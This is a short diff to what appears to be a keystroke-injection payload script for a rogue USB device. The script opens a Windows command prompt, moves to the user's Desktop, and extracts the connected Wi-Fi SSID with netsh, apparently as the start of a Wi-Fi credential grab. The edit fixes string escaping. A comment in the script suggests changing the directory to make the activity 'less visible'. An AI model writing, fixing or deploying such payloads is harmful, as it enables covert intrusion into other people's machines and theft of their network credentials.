@@ -8,7 +8,7 @@ type("cmd")
 press("ENTER")
 delay(1000)
 // --> Change directory (you can change this to something else to make less visible)
-type("cd \"%USERPROFILE%\Desktop\"")
+type("cd \"%USERPROFILE%\\Desktop\"")
 press("ENTER")
 // --> Get SSID
 type("for /f \"tokens=2 delims=: \" %A in (\'netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"B\"') do set SSID=%A")
